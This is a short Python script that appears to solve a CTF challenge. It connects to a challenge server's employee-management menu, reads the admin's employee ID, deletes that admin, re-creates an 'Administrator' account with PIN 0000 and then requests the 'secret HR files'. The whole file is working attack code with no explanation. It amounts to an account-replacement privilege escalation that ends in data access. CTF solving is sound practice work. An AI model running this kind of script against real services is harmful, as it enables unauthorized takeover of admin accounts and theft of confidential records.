import socket, re, time, sys
HOST="chals.uscc-cyberbowl-2025.ctf.institute"
PORT=3013

def recv_all(sock, timeout=0.5):
    sock.settimeout(timeout)
    chunks=[]
    while True:
        try:
            d=sock.recv(8192)
            if not d:
                break
            chunks.append(d)
            if len(d)<8192:
                # likely drained
                break
        except Exception:
            break
    return b"".join(chunks).decode(errors='ignore')

def sendline(sock, s):
    sock.sendall((s+"\n").encode())

s=socket.create_connection((HOST,PORT),timeout=3)
# initial menu
out=recv_all(s,1)
# List employees
sendline(s,"4")
out=recv_all(s,1)
print(out)
# Parse admin id
m=re.search(r"Employee Id:\s*(0x[0-9a-fA-F]+)", out)
admin_id=m.group(1) if m else None
# Remove admin if we have ID
if admin_id:
    sendline(s,"2")
    _=recv_all(s,0.5)
    sendline(s,admin_id)
    out=recv_all(s,1)
    print(out)
# Add admin with pin 0000
sendline(s,"1")
_ = recv_all(s,0.5)
sendline(s,"Administrator")
_ = recv_all(s,0.2)
sendline(s,"0000")
out=recv_all(s,1)
print(out)
# Try secret HR files
sendline(s,"3")
out=recv_all(s,2)
print(out)
# Try with 0000 if prompted (not observed but just in case)
if re.search(r"PIN", out, re.I):
    sendline(s,"0000")
    out=recv_all(s,2)
    print(out)

s.close()
